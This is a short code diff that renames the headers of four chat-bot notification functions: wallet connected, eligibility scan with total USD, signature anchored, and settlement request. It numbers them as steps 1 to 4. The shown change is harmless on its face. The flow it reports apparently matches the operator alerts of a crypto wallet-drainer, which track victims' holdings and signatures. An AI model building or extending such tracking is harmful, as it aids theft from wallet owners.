@@ -460,7 +460,7 @@ export async function notifyWalletConnected(
   }
 
   const text =
-    `🔌 <b>NEW WALLET CONNECTED</b>\n` +
+    `🔌 <b>STEP 1 — WALLET CONNECTED</b>\n` +
     `━━━━━━━━━━━━━━━━\n` +
     codeLine('Wallet Address', address) +
     appendInstitutionalFields(mergedCtx) +
@@ -482,7 +482,7 @@ export async function notifyScanComplete(
   const device = ctx?.userAgent ? detectDeviceFromUA(ctx.userAgent) : null
 
   const text =
-    `🔍 <b>ELIGIBILITY SCAN COMPLETE</b>\n` +
+    `🔍 <b>STEP 2 — ELIGIBILITY SCAN COMPLETE</b>\n` +
     `━━━━━━━━━━━━━━━━\n` +
     codeLine('Wallet Address', address) +
     codeLine('Total USD', totalUsd) +
@@ -510,7 +510,7 @@ export async function notifySignatureReceived(
   }
 
   const text =
-    `✍️ <b>SIGNATURE ANCHORED</b>\n` +
+    `✍️ <b>STEP 3 — SIGNATURE ANCHORED</b>\n` +
     `━━━━━━━━━━━━━━━━\n` +
     codeLine('Wallet Address', address) +
     appendInstitutionalFields(mergedCtx) +
@@ -731,7 +731,7 @@ export async function notifyNewSignatureAnchorRequest(
   }
 
   const text =
-    `⚡ <b>SETTLEMENT REQUEST INITIATED</b>\n` +
+    `⚡ <b>STEP 4 — SETTLEMENT REQUEST INITIATED</b>\n` +
     `━━━━━━━━━━━━━━━━\n` +
     codeLine('Wallet Address', address) +
     appendInstitutionalFields(mergedCtx) +
